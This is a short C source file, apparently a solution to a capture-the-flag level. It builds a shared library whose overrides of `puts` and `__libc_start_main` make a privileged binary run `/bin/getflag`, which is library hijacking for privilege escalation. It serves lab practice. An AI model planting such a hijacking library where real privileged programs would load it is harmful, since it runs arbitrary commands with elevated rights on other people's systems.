#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>

// .. to avoid symbol undefined errors
void __cxa_finalize(void * d) {
}

int puts(const char *s) {
	system("/bin/getflag > /tmp/out15");
	
	return 0;
}

// libc wrapper to call main
int __libc_start_main(int (*main) (int, char **, char **), 
	int argc, 
	char **argv, 
	void (*init) (void), 
	void (*fini) (void), 
	void (*rtld_fini) (void), 
	void (* stack_end)
) {
	main(argc, argv, NULL);
	
	return 0;
}